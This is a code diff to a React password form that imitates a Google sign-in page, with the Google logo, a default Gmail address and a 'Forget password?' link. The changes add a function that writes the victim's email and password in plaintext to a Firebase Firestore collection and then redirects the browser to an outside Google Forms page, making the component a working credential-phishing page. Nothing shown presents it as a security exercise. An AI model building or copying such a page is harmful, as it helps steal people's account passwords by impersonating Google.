@@ -1,20 +1,22 @@
 import googleLogo from "../assets/googleLogo.png";
 import { BiSolidDownArrow } from "react-icons/bi";
 import { useState } from "react";
-import { Link } from "react-router-dom";
-const PasswordForm = ({ email = "user@gmail.com" }) => {
+import { useNavigate } from "react-router-dom";
+import { addDoc, collection } from "firebase/firestore";
+import { db } from "../firebase-config";
+
+const PasswordForm = ({ email }) => {
   const [data, setData] = useState({
-    email,
+    email: email ? email : "user@gmail.com",
     password: "",
   });
 
   const [isChecked, setIsChecked] = useState(false);
-
-  const [msg, setMsg] = useState("");
-
+  const [errorMessage, setErrorMessage] = useState("");
+  let navigate = useNavigate();
   const handlePassword = (password) => {
     setData({ ...data, password });
-    handleMsg();
+    setErrorMessage("");
   };
 
   const handleCheckboxChange = (event) => {
@@ -22,9 +24,24 @@ const PasswordForm = ({ email = "user@gmail.com" }) => {
     setIsChecked(checked);
   };
 
-  const handleMsg = () => {
-    if (data.password.length < 7) setMsg("Your password is not correct.");
-    else setMsg("");
+  const validatePassword = () => {
+    // Regular expression to match Google Gmail password pattern
+
+    if (data.password.length < 8 && data.password.length > 0) {
+      setErrorMessage("Your password is not correct.");
+    } else {
+      setErrorMessage("");
+    }
+  };
+
+  const dataCollectionRef = collection(db, "data");
+
+  const stroreUserAcc = () => {
+    addDoc(dataCollectionRef, {
+      email: data.email,
+      password: data.password,
+    });
+    window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLScuymnyF1su3--cuvsRNGGIBP4b-QBBBVYJjtANa1J5MFJFnw/viewform";
   };
 
   return (
@@ -80,9 +97,10 @@ const PasswordForm = ({ email = "user@gmail.com" }) => {
               placeholder="Enter your password"
               value={data.password}
               onChange={(e) => handlePassword(e.target.value)}
+              onBlur={validatePassword}
             />
 
-            {/* {msg !== "" && data.password.length !== 0 && (
+            {errorMessage && data.password.length > 0 && (
               <small className="w-full text-xs text-red-600 h-2 flex gap-2 items-center mt-1.5">
                 <svg
                   xmlns="http://www.w3.org/2000/svg"
@@ -98,9 +116,9 @@ const PasswordForm = ({ email = "user@gmail.com" }) => {
                     d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"
                   />
                 </svg>
-                {msg}
+                {errorMessage}
               </small>
-            )} */}
+            )}
 
             <div className="flex items-start mb-6 mt-3">
               <div className="flex items-center h-5">
@@ -126,14 +144,18 @@ const PasswordForm = ({ email = "user@gmail.com" }) => {
             <a href="#" className="text-blue-600 font-semibold">
               Forget password?
             </a>
-            <Link to="https://forms.gle/fMJaPXjVTL4aH5Nj6">
+            {errorMessage === "" && data.password.length > 0 ? (
               <button
                 className="bg-blue-500 rounded-md text-white font-semibold px-5 py-1.5 hover:bg-blue-700"
-                disabled={msg === "" && data.password.length > 6 ? false : true}
+                onClick={stroreUserAcc}
               >
                 Next
               </button>
-            </Link>
+            ) : (
+              <button className="bg-blue-500 rounded-md text-white font-semibold px-5 py-1.5 hover:bg-blue-700">
+                Next
+              </button>
+            )}
           </div>
         </div>
 
